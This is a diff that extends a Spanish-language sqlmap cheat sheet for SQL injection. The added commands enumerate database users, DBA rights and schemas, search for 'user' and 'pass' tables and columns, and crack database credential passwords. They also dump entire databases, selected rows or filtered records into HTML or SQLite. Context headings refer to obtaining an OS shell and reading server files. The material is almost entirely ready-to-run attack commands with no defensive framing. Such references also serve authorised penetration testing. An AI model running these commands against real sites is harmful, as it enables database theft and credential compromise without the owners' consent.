@@ -7,12 +7,37 @@ sqlmap -u "<URL>"
 
 #### Conocer el usuario actual
 ```
-sqlmap -u "<URL>" --cookie="<Cookie-Value>" --current-user
+sqlmap -u "<URL>" --current-user
 ```
 
 #### Conocer la Base de Datos actual
 ```
-sqlmap -u "<URL>" --cookie="<Cookie-Value>" --current-db
+sqlmap -u "<URL>" --current-db
+```
+
+#### Conocer la versión de la base de datos
+```
+sqlmap -u "<URL>" --banner
+```
+
+#### Conocer si el usuario actual tiene derechos DBA (administrador)
+```
+sqlmap -u "<URL>" --is-dba
+```
+
+#### Conocer la arquitectura de la base de datos
+```
+sqlmap -u "<URL>" --schema
+```
+
+#### Buscar la palabra 'user' en todas las bases de datos donde contengan como nombre en alguna de sus tablas
+```
+sqlmap -u "<URL>" --search -T user
+```
+
+#### Buscar la palabra 'pass' en todas las bases de datos donde contengan como nombre en alguna de sus columnas
+```
+sqlmap -u "<URL>" --search -C pass
 ```
 
 #### Especificar el Sistema Gestor de Base de Datos
@@ -28,6 +53,16 @@ sqlmap -u "<URL>" --cookie="<Cookie-Value>" --users
 #### Mostrar los privilegios del usuario de la BD
 ```
 sqlmap -u "<URL>" --cookie="<Cookie-Value>" --current-user --privileges
+```
+
+#### Mostrar los errores del DBMS para poder arreglarlos
+```
+sqlmap -u "<URL>" --parse-errors
+```
+
+#### Cracking a las contraseñas de las credenciales especificas de las bases de datos (credenciales de conexión)
+```
+sqlmap -u "<URL>" --passwords --batch
 ```
 
 #### Listar las Bases de Datos del sitio
@@ -50,9 +85,39 @@ sqlmap -u "<URL>" --cookie="<Cookie-Value>" -D <Target-DB> -T <Target-Table> --c
 sqlmap -u "<URL>" --cookie="<Cookie-Value>" -D <Target-DB> -T <Target-Table> -C <Column1,Column2> --dump
 ```
 
+#### Ver contenido de solamente de la segunda y tercera fila de una Tabla
+```
+sqlmap -u "<URL>" --cookie="<Cookie-Value>" -D <Target-DB> -T <Target-Table> --start=2 --stop=3 --dump
+```
+
 #### Ver todo el contenido de una Tabla de una Base de Datos
 ```
 sqlmap -u "<URL>" --cookie="<Cookie-Value>" -D <Target-DB> -T <Target-Table> --dump
+```
+
+#### Ver el contenido de una Base de Datos en donde un campo llamado 'name' y solamente muestre datos donde inician con la letra 'f'
+```
+sqlmap -u "<URL>" --cookie="<Cookie-Value>" -D <Target-DB> -T <Target-Table> --dump --where="name LIKE 'f%'"
+```
+
+#### Dumpear todas las bases de datos que existan en el servidor excluyendo las bases de datos del sistema.
+```
+sqlmap -u "<URL>" --no-cast --dump-all --exclude-sysdbs
+```
+
+#### Dumpear una Base de datos, usando el ataque de UNION y diciendo cuantas columnas se muestran
+```
+sqlmap -u "<URL>" --union-cols=5 --no-cast --dump
+```
+
+#### Dumpear una Base de datos y guardar el resultado en HTML
+```
+sqlmap -u "<URL>" --no-cast --dump --dump-format=HTML
+```
+
+#### Dumpear una Base de datos y guardar el resultado en SQLITE
+```
+sqlmap -u "<URL>" --no-cast --dump --dump-format=SQLITE
 ```
 
 #### Obtener un Shell de OS interactivo
@@ -104,6 +169,11 @@ sqlmap -u "<URL>" -p <PARAMETER> --threads=2 --level=3 --risk=2 --no-cast -A "NO
 #### Enviar diferentes Token CSRF en cada petición
 ```
 sqlmap -u "<URL>" -p <PARAMETER> --level=3 --risk=2 --no-cast -A "NONE" --csrf-url='<URL-REQUEST-POST>' --csrf-token="<NAME-TOKEN-CSRF>" --dbs
+```
+
+#### Enviar diferentes valores a una variable en cada petición que nos hayamos dado cuenta que utiliza el sitio web
+```
+sqlmap -u "<URL>" -p <PARAMETER> --randomize=<NAME-PARAMETER> --batch
 ```
 
 #### Leer un archivo desde un WebServer
